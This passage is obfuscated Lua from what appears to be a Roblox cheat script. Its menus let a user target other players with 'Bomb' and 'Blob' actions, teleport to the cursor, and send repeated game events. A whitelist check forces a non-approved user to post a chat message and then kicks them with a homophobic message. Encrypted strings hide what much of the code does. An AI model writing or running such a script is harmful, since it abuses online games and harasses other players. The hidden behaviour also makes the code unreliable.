						TIME = DEF[LUAOBFUSACTOR_DECRYPT_STR_0("\206\106\94\196", "\225\154\35\19\129\122\158")];
						v53 = 268 - (38 + 228);
					end
					if (v53 == (5 - 2)) then
						v55 = v54.AddSlider(LUAOBFUSACTOR_DECRYPT_STR_0("\110\9\230\82", "\84\58\96\139\55\149\135\176"), {[LUAOBFUSACTOR_DECRYPT_STR_0("\62\54\173", "\94\115\95\195\96\46\175")]=(474 - (106 + 367)),[LUAOBFUSACTOR_DECRYPT_STR_0("\110\74\39", "\128\35\43\95\93\78\77\231")]=(27 + 273),[LUAOBFUSACTOR_DECRYPT_STR_0("\128\24\48", "\201\196\125\86\84\119\30")]=DEF[LUAOBFUSACTOR_DECRYPT_STR_0("\247\199\41\154", "\223\163\142\100")]}, function(v181)
							TIME = v181;
						end);
						v56 = v54.AddSlider(LUAOBFUSACTOR_DECRYPT_STR_0("\181\23\202\165", "\216\226\118\163\209"), {[LUAOBFUSACTOR_DECRYPT_STR_0("\147\249\21", "\95\222\144\123\97\55\16")]=(1867 - (354 + 1508)),[LUAOBFUSACTOR_DECRYPT_STR_0("\52\133\162", "\131\121\228\218\35")]=(192 - 132),[LUAOBFUSACTOR_DECRYPT_STR_0("\253\213\36", "\123\185\176\66\97\25")]=(DEF[LUAOBFUSACTOR_DECRYPT_STR_0("\255\46\48\101", "\81\168\111\121\49\117\79\56")] * (8 + 2))}, function(v182)
							local v183 = 0 + 0;
							while true do
								if ((0 - 0) == v183) then
									WAIT = v182;
									WAIT = WAIT / (1254 - (334 + 910));
									break;
								end
							end
						end);
						v57 = v54.AddSlider(LUAOBFUSACTOR_DECRYPT_STR_0("\247\11\230\189\194\30\246", "\214\167\106\133"), {[LUAOBFUSACTOR_DECRYPT_STR_0("\4\49\66", "\185\73\88\44\47\84\31")]=(1895 - (92 + 803)),[LUAOBFUSACTOR_DECRYPT_STR_0("\165\214\2", "\159\232\183\122\192\179")]=(1653 + 1347),[LUAOBFUSACTOR_DECRYPT_STR_0("\0\55\174", "\65\68\82\200")]=DEF[LUAOBFUSACTOR_DECRYPT_STR_0("\21\113\81\11", "\30\69\48\18\64\175\175")]}, function(v184)
							PACK = v184;
						end);
						v54.AddLabel(LUAOBFUSACTOR_DECRYPT_STR_0("\211\36\16\227\40\245\108\43\245\43\245\108\44\248\58\226\56", "\91\144\76\127\140"));
						v53 = 1185 - (1035 + 146);
					end
					if (v53 == (620 - (230 + 386))) then
						v58 = v54.AddButton(LUAOBFUSACTOR_DECRYPT_STR_0("\193\29\82\46", "\176\128\104\38\65\179\218\181"), function()
							SEND(0 + 0);
						end);
						v59 = v54.AddButton(LUAOBFUSACTOR_DECRYPT_STR_0("\224\205\204\18\144\231\205\27\196\214\205\25", "\117\176\164\162"), function()
							SEND(1511 - (353 + 1157));
						end);
						v60 = v54.AddButton(LUAOBFUSACTOR_DECRYPT_STR_0("\170\205\69\192\211\119\131\130\38\255\212\109\150\205\9", "\25\228\162\101\144\186"), function()
							SEND(1116 - (53 + 1061));
						end);
						v61 = v54.AddButton(LUAOBFUSACTOR_DECRYPT_STR_0("\123\34\182\30", "\132\40\86\217\110\146"), function()
							STP = true;
						end);
						v53 = 1640 - (1568 + 67);
					end
				end
			end
			v3 = 1 + 1;
		end
		if (v3 == (1 + 4)) then
			Bomb.AddDropdown(LUAOBFUSACTOR_DECRYPT_STR_0("\78\194\36\183\231\67\240\95\103\206\53", "\62\30\171\71\220\199\19\156"), players_mass, function(v63)
				player_tail = v63;
			end);
			Bomb.AddButton(LUAOBFUSACTOR_DECRYPT_STR_0("\102\76\190\51\28", "\45\32\37\204\86\61\169\79"), function()
				Run(Type, TypeBoom);
			end);
			blob_p.AddDropdown(LUAOBFUSACTOR_DECRYPT_STR_0("\101\92\6\183\245\76\89\84\28\185\167", "\28\53\53\101\220\213"), players_mass, function(v64)
				focus_pname = v64;
			end);
			blob_p.AddButton(LUAOBFUSACTOR_DECRYPT_STR_0("\62\72\9\83\78", "\191\109\60\104\33\58\193\48"), function()
				call();
			end);
			task.spawn(anim());
			function remass()
				local v65 = 0 - 0;
				while true do
					if (v65 == (11 - 7)) then
						if not game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\164\216\10\226\160\194\17", "\135\231\183\120"))['_']['ContainerFrame']['MainFrame']['Display']['Blob']:FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\214\3\79\239\117\42\165\231\19\73\246\17\40\134\214\46\99\211\27", "\201\134\106\44\132\85\122")) then
							blob_p.AddDropdown(LUAOBFUSACTOR_DECRYPT_STR_0("\6\5\116\52\65\60\196\34\47\9\101", "\67\86\108\23\95\97\108\168"), players_mass, function(v207)
								focus_pname = v207;
							end);
						end
						if not game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\135\55\94\15\131\49\220", "\48\196\88\44\106\196\68\181"))['_']['ContainerFrame']['MainFrame']['Display']['Blob']:FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\177\203\221\49\148\134\151\24\182\240\242", "\76\226\191\188\67\224\196\194")) then
							blob_p.AddButton(LUAOBFUSACTOR_DECRYPT_STR_0("\234\60\6\226\233", "\157\185\72\103\144"), function()
								call();
							end);
						end
						if not game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\122\188\152\127\143\164\80", "\209\57\211\234\26\200"))['_']['ContainerFrame']['MainFrame']['Display']['Bomb']:FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\49\199\165\138\16\226\13\207\191\132\66\246\51\225\150\165\127\229\47", "\178\97\174\198\225\48")) then
							Bomb.AddDropdown(LUAOBFUSACTOR_DECRYPT_STR_0("\255\95\7\250\56\214\3\206\79\1\227", "\111\175\54\100\145\24\134"), players_mass, function(v208)
								player_tail = v208;
							end);
						end
						v65 = 12 - 7;
					end
					if (v65 == (3 + 0)) then
						Bomb.AddDropdown(LUAOBFUSACTOR_DECRYPT_STR_0("\115\16\35\30\3\41\44\20\90\28\50", "\117\35\121\64"), players_mass, function(v185)
							player_tail = v185;
						end);
						Bomb.AddButton(LUAOBFUSACTOR_DECRYPT_STR_0("\251\180\252\211\98", "\47\189\221\142\182\67"), function()
							Run(Type, TypeBoom);
						end);
						wait();
						v65 = 1216 - (615 + 597);
					end
					if ((1 + 0) == v65) then
						if game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\3\176\53\206\111\188\41", "\73\64\223\71\171\40\201\64"))['_']['ContainerFrame']['MainFrame']['Display']['Blob']:FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\58\132\199\82\224\77\6\140\221\92\178\89\56\162\244\125\143\74\36", "\29\106\237\164\57\192")) then
							game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\146\171\245\191\242\199\169", "\146\209\196\135\218\181\178\192"))['_']['ContainerFrame']['MainFrame']['Display']['Blob'][LUAOBFUSACTOR_DECRYPT_STR_0("\29\57\128\26\16\151\33\49\154\20\66\131\31\31\179\53\127\144\3", "\199\77\80\227\113\48")]:Destroy();
						end
						if game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\9\48\76\200\13\42\87", "\173\74\95\62"))['_']['ContainerFrame']['MainFrame']['Display']['Blob']:FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\245\13\93\36\223\37\137\242\45\115\24", "\220\166\121\60\86\171\103")) then
							game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\202\13\47\181\28\223\19", "\122\137\98\93\208\91\170"))['_']['ContainerFrame']['MainFrame']['Display']['Blob'][LUAOBFUSACTOR_DECRYPT_STR_0("\180\245\29\93\193\144\156\254\179\206\50", "\170\231\129\124\47\181\210\201")]:Destroy();
						end
						if game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\168\180\40\53\45\63\130", "\74\235\219\90\80\106"))['_']['ContainerFrame']['MainFrame']['Display']['Bomb']:FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\124\202\88\48\122\196\118\243\85\198\73\31\8\219\74\214\99\244\117", "\146\44\163\59\91\90\148\26")) then
							game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\86\34\170\132\110\96\36", "\41\21\77\216\225"))['_']['ContainerFrame']['MainFrame']['Display']['Bomb'][LUAOBFUSACTOR_DECRYPT_STR_0("\36\68\113\78\84\125\126\68\13\72\96\97\38\98\66\97\59\122\92", "\37\116\45\18")]:Destroy();
						end
						v65 = 2 - 0;
					end
					if (v65 == (5 + 0)) then
						if not game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\236\240\68\167\140\218\246", "\203\175\159\54\194"))['_']['ContainerFrame']['MainFrame']['Display']['Bomb']:FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\93\199\11\62\27\109\247\79\250\54\21", "\162\27\174\121\91\58\47")) then
							Bomb.AddButton(LUAOBFUSACTOR_DECRYPT_STR_0("\245\204\13\240\126", "\185\179\165\127\149\95"), function()
								Run(Type, TypeBoom);
							end);
						end
						break;
					end
					if (v65 == (1 + 1)) then
						if game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\114\122\221\241\48\68\124", "\119\49\21\175\148"))['_']['ContainerFrame']['MainFrame']['Display']['Bomb']:FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\113\188\4\88\108\107\191\193\99\154\56", "\149\55\213\118\61\77\41\234")) then
							game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\62\9\216\195\206\44\166", "\123\125\102\170\166\137\89\207"))['_']['ContainerFrame']['MainFrame']['Display']['Bomb'][LUAOBFUSACTOR_DECRYPT_STR_0("\104\9\74\56\79\161\156\122\52\119\19", "\201\46\96\56\93\110\227")]:Destroy();
						end
						blob_p.AddDropdown(LUAOBFUSACTOR_DECRYPT_STR_0("\139\10\237\242\85\241\183\2\247\252\7", "\161\219\99\142\153\117"), players_mass, function(v186)
							focus_pname = v186;
						end);
						blob_p.AddButton(LUAOBFUSACTOR_DECRYPT_STR_0("\79\165\167\97\217", "\173\28\209\198\19"), function()
							call();
						end);
						v65 = 2 + 1;
					end
					if ((1899 - (1056 + 843)) == v65) then
						players_mass = {};
						for v187, v188 in game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\69\224\182\162\112\254\164", "\219\21\140\215")):GetPlayers() do
							local v189 = 0 - 0;
							while true do
								if (v189 == (0 - 0)) then
									table.insert(players_mass, v188.Name);
									wait();
									break;
								end
							end
						end
						if not table.find(acc_y, game['Players']['LocalPlayer']['UserId'] .. game['Players']['LocalPlayer']['Character']['Name']) then
							local v202 = 0 - 0;
							local v203;
							local v204;
							while true do
								if (v202 == (0 + 0)) then
									v203 = LUAOBFUSACTOR_DECRYPT_STR_0("\8\145\235\231\127\105\129\135\230\25", "\56\40\216\166\199");
									v204 = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\20\177\5\35\47\183\20\59\35\176\38\59\41\166\20\40\35", "\79\70\212\117"))['DefaultChatSystemChatEvents']['SayMessageRequest']:FireServer(v203, LUAOBFUSACTOR_DECRYPT_STR_0("\134\26\237", "\109\199\118\129\166\153"));
									v202 = 1977 - (286 + 1690);
								end
								if (v202 == (912 - (98 + 813))) then
									game['Players']['LocalPlayer']:Kick("Error code: GAY \n[ Made with ❤️ by Range#8998 and Reyn#7525 ]");
									break;
								end
							end
						end
						v65 = 1 + 0;
					end
				end
			end
			v3 = 14 - 8;
		end
		if (v3 == (3 + 1)) then
			mouse = plr:GetMouse();
			mouse['KeyDown']:connect(function(v66)
				if (v66 == "z") then
					if mouse['Target'] then
						hum['CFrame'] = CFrame.new(mouse['Hit'].x, mouse['Hit']['y'] + (512 - (263 + 244)), mouse['Hit'].z);
					end
				end
			end);
			print(LUAOBFUSACTOR_DECRYPT_STR_0("\31\181\101\222\36\178\55\225\48\163\55\229\36\179\116\243\34\163\113\227\61\188\110\182\36\160\123\249\48\180\114\242\112", "\150\81\208\23"));
			PlayersOn = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\218\202\242\142\222\208\233", "\235\153\165\128"))['_']['ContainerFrame']['MainFrame']['Display']['Main'][LUAOBFUSACTOR_DECRYPT_STR_0("\139\69\163\54\67\52\185\190\180\71\226\60\67\52\188\251\169\19\226\3\103\4\143\210", "\158\219\41\194\79\38\70\202")]['LabelForeground']['TextLabel'];
			players_mass = {};
			for v67, v68 in game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\115\41\46\27\235\196\155", "\232\35\69\79\98\142\182")):GetPlayers() do
				local v69 = 0 + 0;
				while true do
					if (v69 == (1687 - (1502 + 185))) then
						table.insert(players_mass, v68.Name);
						wait();
						break;
					end
				end
			end
			v3 = 1 + 4;
		end
	end
end
